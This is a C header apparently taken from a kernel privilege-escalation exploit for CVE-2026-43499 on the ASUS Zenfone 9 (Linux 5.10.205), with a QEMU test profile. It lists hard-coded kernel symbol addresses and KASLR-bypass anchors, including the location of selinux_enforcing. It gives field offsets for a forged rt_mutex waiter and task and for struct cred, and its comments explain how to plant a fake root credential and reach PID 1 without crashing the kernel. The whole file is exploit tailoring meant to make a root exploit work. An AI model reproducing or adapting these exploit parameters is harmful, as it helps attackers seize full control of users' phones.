/* target.h ??CVE-2026-43499 @ ASUS Zenfone 9 (ASUS_AI2202), k5.10.205
 * QEMU test build: kernel.raw loaded by qemu virt at RAM_BASE+2MB.
 * SysVAs are the link-time addresses from the shipped kernel.raw (.symtab). */
#ifndef TARGET_H
#define TARGET_H

/* target profile */
#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#ifdef ZF9_DEVICE
#define P0_PHYS_OFFSET 0x80000000ULL          /* Qualcomm DRAM base (= memstart_addr) */
#define P0_KERNEL_PHYS_LOAD 0x80000000ULL     /* default; override at runtime via argv[1]=delta */
#define P0_RAM_SIZE 0x200000000ULL            /* 8 GiB total */
#define P0_DMAP_END_OFF 0x900000000ULL        /* farthest direct-map offset: RAM @phys 2-4G + 32-38G */
#else
#define P0_PHYS_OFFSET 0x40000000ULL          /* qemu virt RAM base (= memstart_addr) */
#define P0_RAM_SIZE 0x80000000ULL             /* qemu -m 2G */
#define P0_DMAP_END_OFF 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x40200000ULL     /* /proc/iomem Kernel code start; delta 0x200000 */
#endif
#define PSELECT_WAITER_WORD_SHIFT 0           /* measured in-guest (kprobe): waiter == stack_fds */

/* kernel image addresses (absolute link-time VAs) */
#define INIT_TASK 0xffffffc00a79bec0ULL
#define INIT_CRED 0xffffffc00a7b0ae0ULL
#define ENTRY_TASK 0xffffffc00a7562f8ULL
#define PER_CPU_OFFSET 0xffffffc00a78a558ULL
#define ROOT_TASK_GROUP 0xffffffc00a991040ULL
#define SELINUX_ENFORCING 0xffffffc00aa40b98ULL

/* KASLR anchors */
#define SLIDE_NFULNL_LOGGER_IMAGE 0xffffffc00a7913a0ULL
#define SLIDE_INIT_TASK_IMAGE 0xffffffc00a79bec0ULL
#define SLIDE_ROOT_TASK_GROUP_IMAGE 0xffffffc00a991040ULL
#define SLIDE_LOGGERS_0_1_IMAGE 0xffffffc00a7912d0ULL        /* loggers(0xa7912c8)+8 */
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE 0xffffffc00a8a76d0ULL /* &random_table[4].data */
/* §124.46 anchor-hardening pack: nsproxy anchor (boot-invariant, unlike the
   netd-filled init_net loggers slots) + banner pipeline check.
   TASK_NSPROXY_OFF verified by disassembly (switch_task_namespaces ldr/str
   x19+0x7d0; create_new_namespaces 4x ldr x21+0x7d0) and by .data scan
   (init_task+0x7d0 == init_nsproxy). */
#define SLIDE_INIT_NSPROXY_IMAGE 0xffffffc00a7b0980ULL
/* §124.94 tasksprev anchor: init_task.tasks.prev field address (INIT_TASK +
   TASK_TASKS_OFF + 8).  Fixup-safe: content is a list_head next (= true task,
   empty pi tree -> walk terminates early, step-1 lived 3/3).  Readout is
   self-consistent (got - anchor == slide when the walk terminates at node).
   See §124.94 for the full chase-path attribution (fixup, not successor). */
#define SLIDE_INIT_TASKPREV_IMAGE (0xffffffc00a79bec0ULL + 0x4c8 + 8)
#define SLIDE_LINUX_BANNER_IMAGE 0xffffffc00a128bacULL
#define TASK_NSPROXY_OFF 0x7d0

/* §113 zerolock: zero, unreferenced, WRITABLE scratch.  Measured dead ends:
   (a) the linker padding page after swapper_pg_dir - RO ("write to read-only
   memory" at its alias); (b) swapper_pg_dir's own unused PGD slots - also RO
   (the whole [__start_rodata, __init_begin) block is RO on this linkage);
   (c) .bss - live dump found only 2 zero pages, both inside the printk ring
   (__log_buf) and therefore rewritten cyclically.  The only RW + always-zero
   page in the image is empty_zero_page (arch/arm64/mm/mmu.c:56,
   __page_aligned_bss, .bss => RW, never written).  We stay 0x800 into the page
   so the lock word is not at the page head: exposure is limited to a concurrent
   user hole-read of >= 0x808 bytes within the microseconds the walk holds the
   lock (STATUS §113.12).  word6 (waiter->task) is read-only for us, so a second
   offset of the same page is enough. */
#define ZERO_LOCK_IMAGE 0xffffffc00a98c900ULL
#define ZERO_WORD6_IMAGE 0xffffffc00a98c000ULL
/* §115.2: slots are 0x40 apart now (each slot needs only its own 0x18 field +
   8 bytes; the measured poison footprint is +0x00/+0x08/+0x10), so the page
   holds 24 of them: 0x900 + k*0x40, k=0..23 => 0x900..0xEC0, and the lock's
   0x20 bytes stay inside the page.  The happy path uses slide + tail + verify +
   cred x2 + restore = 6; the tail retry needs 2 more; 24 leaves ample headroom
   for future steps.  Slot exhaustion is still a clean stop. */
#define ZERO_LOCK_STRIDE 0x40
#define ZERO_LOCK_SLOTS 24
/* §115.2 restore target: char sysctl_bootid[16] - the buffer boot_id.data
   normally points at.  Pointing it back makes /proc/sys/kernel/random/boot_id
   return a UUID-format string again in the root->reboot window.  (Honest level:
   shape-0 collateral lands on sysctl_bootid+8, so the pointer is restored while
   the UUID's second half is overwritten with the field's address - the string is
   format-valid, not the original value.) */
#define SYSCTL_BOOTID_IMAGE 0xffffffc00aa5fbb5ULL
/* §116 cad_pid route to PID 1's task (avoids the process list entirely: reading
   init_task.tasks.next puts the shape-0 collateral on tasks.prev, and
   CONFIG_DEBUG_LIST BUGs on the next fork anywhere - measured 3/3 QEMU).
   cad_pid is set by PID 1 itself (init/main.c:1500 cad_pid =
   get_pid(task_pid(current))), so it holds PID 1's struct pid.  Reading it
   damages its +8 neighbour async_lock.owner (a boot-time-only mutex).
   Offsets binary-verified from pid_task/attach_pid: struct pid.tasks[] = 0x10,
   struct task_struct.pid_links[0] = 0x638. */
#define CAD_PID_IMAGE 0xffffffc00a98efa0ULL
#define PID_TASKS_OFF 0x10
#define TASK_PID_LINKS_OFF 0x638

/* waiter fields (5.10 flat layout; no wake_state/ww_ctx) */
#define WAITER_TREE_ENTRY_OFF 0x0
#define WAITER_PI_TREE_ENTRY_OFF 0x18
#define WAITER_TASK_OFF 0x30
#define WAITER_LOCK_OFF 0x38
#define WAITER_PRIO_OFF 0x40
#define WAITER_DEADLINE_OFF 0x48

/* fake waiter */
#define FAKE_WAITER_TREE_PRIO_OFF 0x40
#define FAKE_WAITER_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF 0x30
#define FAKE_WAITER_LOCK_OFF 0x38

/* fake task fields (measured) */
#define FAKE_TASK_USAGE_OFF 0x40
#define FAKE_TASK_PRIO_OFF 0x84
#define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
#define FAKE_TASK_TASK_GROUP_OFF 0x310
#define FAKE_TASK_PI_LOCK_OFF 0x86c
#define FAKE_TASK_PI_WAITERS_OFF 0x880
#define FAKE_TASK_PI_TOP_TASK_OFF 0x890
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x898
#define FAKE_TASK_UCLAMP_REQ_OFF 0x408
#define FAKE_TASK_UCLAMP_OFF 0x410

/* task credential pointers (measured) */
#define TASK_REAL_CRED_OFF 0x778
#define TASK_PID_OFF 0x5C8        /* pid (u32) @ 0x5C8, tgid (u32) @ 0x5CC */
#define TASK_COMM_OFF 0x790       /* comm[16]; §113.21 verify reads comm[0..7] */
#define TASK_TASKS_OFF 0x4C8      /* struct list_head tasks; B'' reads .prev at +8 */
#define TASK_CRED_OFF 0x780

/* struct cred (5.10, verified against kernel.elf) */
#define CRED_USAGE_OFF 0x00
#define CRED_UID_OFF 0x04
#define CRED_GID_OFF 0x08
#define CRED_SUID_OFF 0x0c
#define CRED_SGID_OFF 0x10
#define CRED_EUID_OFF 0x14
#define CRED_EGID_OFF 0x18
#define CRED_FSUID_OFF 0x1c
#define CRED_FSGID_OFF 0x20
#define CRED_SECUREBITS_OFF 0x24
#define CRED_CAP_INH_OFF 0x28
#define CRED_CAP_PERM_OFF 0x30
#define CRED_CAP_EFF_OFF 0x38
#define CRED_CAP_BSET_OFF 0x40
#define CRED_CAP_AMB_OFF 0x48
#define CRED_SECURITY_OFF 0x78
#define CRED_USER_NS_OFF 0x88

/* v14: place a self-made root cred in our own controllable DMAP page.
   The shape-0/1 write primitive leaves collateral damage at (value+8), so
   pointing task->cred straight at init_cred corrupts init_cred itself;
   a private copy absorbs that. */
#define FAKE_CRED_OFF (g_cred_off)
#define PM_CRED 0x900

#endif
